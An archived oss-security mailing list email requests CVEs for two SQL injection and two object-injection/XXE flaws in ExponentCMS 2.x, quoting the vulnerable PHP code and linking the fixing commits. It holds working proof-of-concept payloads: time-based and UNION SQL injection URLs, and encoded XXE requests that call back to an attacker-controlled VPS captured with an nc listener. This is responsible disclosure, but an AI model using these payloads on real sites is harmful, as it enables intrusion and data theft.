X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4263" "Friday" "30" "September" "2016" "12:22:38" "+0800" "Carl Peng" "felixk3y@gmail.com" "<CAEiFw0WzL4iVgrZYJsoizHbX8_s+tgGc4xJDnYgr1y4SVv=UrA@mail.gmail.com>" "115" "[oss-security] CVE request: ExponentCMS 2.x Object Injection and SQLi vulnerabilities" "^Date:" nil nil "9" "2016093004:22:38" "[oss-security] CVE request: ExponentCMS 2.x Object Injection and SQLi vulnerabilities" (number mark "U       felixk3y@gma Sep 30  115/4263  " thread-indent "\"[oss-security] CVE request: ExponentCMS 2.x Object Injection and SQLi vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26439 invoked by uid 550); 30 Sep 2016 13:32:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 10010 invoked from network); 30 Sep 2016 04:22:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=sW+Z9WjNk70gWzEfjYE2jnkLawPXnybCJwvzHSZ0pf4=;
        b=fqzkfwB/Zf7gxyi/LJrnOiDJpQ1GpwYqDt9x0hyQVrcUq9BKbMIuTP1DiTfP6I793C
         aEcOA5X0y+NhlzJL7jpR+NodSQdQgHAbllEVV6fFjCQT5eD2d1CTH7ek9cE5WlsDljn6
         8+X4x0lhc3tP4BcYJVjvDOEHdaaICc8sZIRUTryaRpojfhX1Cm6sva2IkQ/mJQ5OzQ4p
         CyHTCQf9LXvzA/Mjly65Y9zbayGSoXOGlrbgmvlmQ1sb5/wFBUImSHlRRm7Es/ccFEZ+
         1YcFlVUqS/65OOY7vXF6xHO3h9AkRxk2uZ4hHsN6bR9BFzqxnaWWTXddDhOut+7fp2X3
         RIuQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=sW+Z9WjNk70gWzEfjYE2jnkLawPXnybCJwvzHSZ0pf4=;
        b=hb17zhw837RTVlo1ZAZfX+bxNllR3jCjLFUSeCWNDh2i68j8lc+DmegjCyjif0ALKA
         OfKVGCsuwkyHdLYFJ4zUtx/d8Vty6OurkDToLy7c5a7iRs6nD+j4YnPb03rTRo+HwboO
         gGZEGArq857Tf7i8PscOgOX1HxuqpT//t6s2C6ETzjiY0K+VR6CqSJUGOxwhKoL9yTyd
         wTlbR+3/kt3nefdXmp1lcqk1+6Bo6xT1qihpBUDYxda8RTchpyGMHxBjDIggKFUJ7lCa
         In2cqiwOJWScXBEM+Dnkw0M6iUHaOJehqH9VSBzMsPduhiyY6+2IilLAfM84Pcv0iyL7
         CDcg==
X-Gm-Message-State: AA6/9RnqOgJMHR7KSP9nno7+uC/wQ2MsDddX95V9/ZdB6VjrPgzueM6fuJRseYtBvDpNUadZH6ex0njnbnVW/w==
X-Received: by 10.194.30.167 with SMTP id t7mr4069720wjh.199.1475209359194;
 Thu, 29 Sep 2016 21:22:39 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAEiFw0WzL4iVgrZYJsoizHbX8_s+tgGc4xJDnYgr1y4SVv=UrA@mail.gmail.com>
Content-Type: multipart/alternative; boundary=047d7b66f3fdd2fda0053db1f1f8
Date: Fri, 30 Sep 2016 12:22:38 +0800
From: Carl Peng <felixk3y@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE request: ExponentCMS 2.x Object Injection and SQLi vulnerabilities
To: oss-security@lists.openwall.com

--047d7b66f3fdd2fda0053db1f1f8
Content-Type: text/plain; charset=UTF-8

hello,
I reported the following vulnerabilities to the ExponentCMS team some days
ago, and now has been fixed.

1) sqli-1
/framework/modules/ecommerce/controllers/cartController.php
lines 61 - 66:
```
$product_type = isset($this->params['product_type']) ?
$this->params['product_type'] : 'product';
$product      = new product();
//if we're trying to add a parent product ONLY, then we redirect to it's
show view
$c = new stdClass();
if (isset($this->params['product_id']) && empty($this->params['children']))
$c = $product->find('first', 'parent_id=' . $this->params['product_id']);
//sqli
if (!empty($c->id)) {
flash('message', gt("Please select a product and quantity from the options
listed below to add to your cart."));
redirect_to(array('controller'=> 'store', 'action'=> 'show', 'id'=>
$this->params['product_id']));
}
```
the parameter of "product_id" fail to filtered, we can input
"product_id=sqli" to execute SQL statements.
Proof of concept:
/index.php?controller=cart&action=addItem&product_id=-1/**/and/**/1=if(1,sleep(1),0)%23

2) sqli-2
/framework/modules/help/controllers/helpController.php
lines 122 - 131:
```
if (empty($this->params['version']) || $this->params['version'] ==
'current') {
            $version_id = help_version::getCurrentHelpVersionId();
   } else {
            $version_id =
help_version::getHelpVersionId($this->params['version']); //sqli
            if (empty($version_id)) {
                $version_id = help_version::getCurrentHelpVersionId();
            }
   }
   $doc = $help->find('first', 'help_version_id='.$version_id.' AND
sef_url="'.$this->params['title'].'"'); //sqli
        $children = $help->find('count','parent='.$doc->id);
```
The parameters of "version" and "title" fail to filtered, we can input
"version=sqli" or "title=sqli"to execute SQL statements.
Proof of concept:
/index.php?controller=help&action=show&version=1" union select
1%23&title=aaa" union select
1,user(),3,4,5,6,7,8,9,0,11,12,1,2,3,4,5,6,7,8,9,0,11,12%23

3) Object Injection -1
/framework/modules/core/controllers/expTagController.php#L228-L232
```
foreach ($this->params['change_tag'] as $item) { // $item from user input
    $params['expTag'] = array();
    $classname = $this->params['mod'];
    $object = new $classname($item); // $classname also from user input
    expTag::deleteTag($this->params['mod'], $object->id);
    //...
}
```
Proof of concept(XXE):
[ We could use php class "SimpleXMLElement"(
http://cn2.php.net/manual/en/simplexmlelement.construct.php) to exploit it ]
step 1:
VPS listening.. (nc -lvvp 8080)
step 2:
/index.php?controller=expTag&action=change_tags&mod=SimpleXMLElement&change_tag[]=%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2Fvps_ip%3A8080%2Fxxe_exists%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E

4) Object Injection -2
/framework/modules/core/controllers/expCatController.php#L175-L182
```
if (!empty($this->params['change_cat'])) {
foreach ($this->params['change_cat'] as $item) {
$classname = $this->params['mod'];
$object = new $classname($item);
$params['expCat'][0] = $this->params['newcat'];
$object->update($params);
}
}
```
Proof of concept(XXE):
[ We could use php class "SimpleXMLElement"(
http://cn2.php.net/manual/en/simplexmlelement.construct.php) to exploit it ]
step 1:
VPS listening.. (nc -lvvp 8080)
step 2:
/index.php?controller=expCat&action=change_cats&mod=SimpleXMLElement&change_cat[]=%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2Fyour_vps_ip%3A8080%2Fxxe_exists%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E

[root@cloud ~]# nc -lvvp 8080
Listening on any address 8080 (webcache)
Connection from 8.8.8.8:63017
GET /xxe_exists HTTP/1.0
Host: your_vps_ip:8080


And now, all vulnerabilities have been fixed.
https://github.com/exponentcms/exponent-cms/commit/99636b2118cd9af4eb9920f6b6c228bd824593d2
https://github.com/exponentcms/exponent-cms/commit/fdafb5ec97838e4edbd685f587f28d3174ebb3db

these issues was reported by Peng Hua of silence.com.cn Inc. and I would
like to request CVEs for these issues (if not done so).

-------------------http://www.silence.com.cn/
penghua@silence.com.cn
PKAV Team

--047d7b66f3fdd2fda0053db1f1f8--
